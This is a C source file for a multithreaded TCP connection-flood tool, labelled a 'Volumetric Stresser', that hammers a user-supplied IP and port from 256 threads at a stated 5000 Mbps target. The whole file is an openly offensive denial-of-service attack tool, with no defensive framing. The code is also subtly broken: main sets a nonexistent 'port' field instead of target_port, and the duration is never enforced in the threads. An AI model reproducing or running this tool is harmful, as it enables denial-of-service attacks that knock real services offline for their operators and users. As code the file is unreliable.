#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <fcntl.h>

// Performance Constants
#define PAYLOAD_SIZE 1400 // Optimized to stay within standard MTU
#define THREAD_TARGET 256 // Scaled for high-performance cloud instances

typedef struct {
    char target_ip[16];
    int target_port;
    int duration;
} AttackArgs;

void *volumetric_syn_stresser(void *args) {
    AttackArgs *a = (AttackArgs *)args;
    char buffer[PAYLOAD_SIZE];
    memset(buffer, 'A', PAYLOAD_SIZE); // Filling buffer for volumetric weight

    while(1) {
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) continue;

        // Set Non-Blocking for maximum PPS (Packets Per Second)
        fcntl(s, F_SETFL, O_NONBLOCK);

        struct sockaddr_in target_addr;
        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(a->target_port);
        inet_pton(AF_INET, a->target_ip, &target_addr.sin_addr);

        // Initiate Connection (Triggers SYN)
        connect(s, (struct sockaddr *)&target_addr, sizeof(target_addr));
        
        // Rapid-fire payload to hit the 5000Mbps target
        // This pushes data immediately after the SYN
        send(s, buffer, PAYLOAD_SIZE, MSG_DONTWAIT);

        // Close instantly to recycle socket descriptors
        close(s);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Usage: %s <IP> <Port> <Time>\n", argv[0]);
        return 1;
    }

    AttackArgs args;
    strncpy(args.target_ip, argv[1], 16);
    args.port = atoi(argv[2]);
    args.duration = atoi(argv[3]);

    pthread_t threads[THREAD_TARGET];
    printf("[!] Launching Volumetric Stresser: Target %d Mbps\n", 5000);

    for (int i = 0; i < THREAD_TARGET; i++) {
        pthread_create(&threads[i], NULL, volumetric_syn_stresser, &args);
    }

    sleep(args.duration);
    return 0;
}
